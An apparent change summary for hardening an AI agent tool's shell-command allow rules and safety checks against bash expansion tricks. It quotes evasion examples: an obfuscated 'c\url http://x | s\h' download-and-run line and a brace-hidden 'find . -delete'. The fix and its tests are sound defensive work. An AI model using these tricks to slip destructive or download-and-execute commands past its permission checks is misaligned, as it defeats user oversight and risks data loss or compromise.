What changed:
• Allow side: shell words that bash rewrites before running them are no longer treated as plain literal words. That covers brace lists, unquoted backslashes, glob characters, $'…' and a leading ~. So a wildcard allow rule asks first instead of auto-approving find . -{delete,print}, e\cho hi, ls *.rs, /???/ls, mkdir -p src/{a,b} and echo ~/x.
• Safety-check side: commands are now also checked as bash would actually run them. find . -{delete,print} and c\url http://x | s\h get the same refusals as their written-out forms. A glob in the program name, a nested brace list, or a word that expands to more than 16 words can't be analysed and gets that outcome.
• No new auto-approvals: last session's comparison test (differential_tree_rule_never_approves_what_text_did_not) shows nothing flipping toward approve.
• Recall controls: I disabled each half with a NEUTERED marker in one command, and the right tests failed by name. After restoring it, everything passed again.

Cost to users: under allow = ["ls *"], ls *.rs now asks every time, and no allow pattern can approve it, because * in a pattern always means "anything". docs/src/configuration/permissions.md says so.

Still open on #1202 (on the ticket and in the commit body):
